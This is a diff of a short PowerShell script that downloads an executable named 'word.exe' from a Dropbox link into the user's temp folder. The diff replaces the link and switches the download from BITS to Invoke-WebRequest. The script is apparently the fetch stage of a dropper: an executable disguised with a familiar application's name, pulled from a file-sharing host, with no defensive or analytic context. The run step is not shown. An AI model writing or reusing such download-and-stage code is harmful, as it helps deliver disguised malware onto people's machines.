@@ -1,13 +1,13 @@
-$DownloadUrl = "https://www.dropbox.com/scl/fi/nmw82t48k2i0y43vzl3uw/word.exe?rlkey=kua8330w3d0f8vvimhevqcxoc&st=zekyrblp&dl=1"
+$DownloadUrl = "https://www.dropbox.com/scl/fi/47rx0jxpexjzv50pqu816/word.exe?rlkey=wigi3xc1w1wxk62jh0n1nj05v&st=vv97m7bo&dl=1"
 $ExeName     = "word.exe"
 $Arguments   = ""
 $DestPath    = Join-Path $env:TEMP $ExeName
 
-Write-Host "Downloading $ExeName via BITS..."
+Write-Host "Downloading $ExeName..."
 
 try {
-    # Using BITS transfer for a more robust background download
-    Start-BitsTransfer -Source $DownloadUrl -Destination $DestPath
+    # Using Invoke-WebRequest with -ErrorAction Stop to force the catch block on failure
+    Invoke-WebRequest -Uri $DownloadUrl -OutFile $DestPath -ErrorAction Stop
     Write-Host "Downloaded to: $DestPath"
 } catch {
     Write-Error "Download failed: $_"
